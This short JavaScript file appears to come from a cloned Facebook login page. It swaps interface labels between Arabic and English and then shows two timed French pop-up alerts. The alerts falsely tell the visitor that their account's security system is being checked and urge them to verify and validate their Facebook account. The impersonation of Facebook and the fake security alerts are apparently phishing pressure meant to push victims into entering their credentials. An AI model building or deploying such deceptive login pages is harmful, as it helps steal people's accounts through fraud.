var arabe= document.getElementById("arabe");
var frnacais= document.getElementById("frnacais");
var login = document.getElementById("login");
var forget = document.getElementById("forget");
var or = document.getElementById("or");
var create = document.getElementById("create");

function arab (){
  login.innerHTML="تسجيل الدخول";
  forget.innerHTML="هل نسيت كلمة المرور؟";
  or.innerHTML="او";
  create.innerHTML="إنشاء حساب جديد على فيسبوك";
}
function angl(){
  login.innerHTML="login";
  forget.innerHTML="Forget Password ?";
  or.innerHTML="or";
  create.innerHTML="Create new Facebook account "; 
}

  setTimeout(()=>{alert("Nous sommes en train de verifier le systeme de securite de votre compte...")},3*1000)
setTimeout(()=>{alert("Merci de verifiet et valider votre compte facebook.")},4*1000)
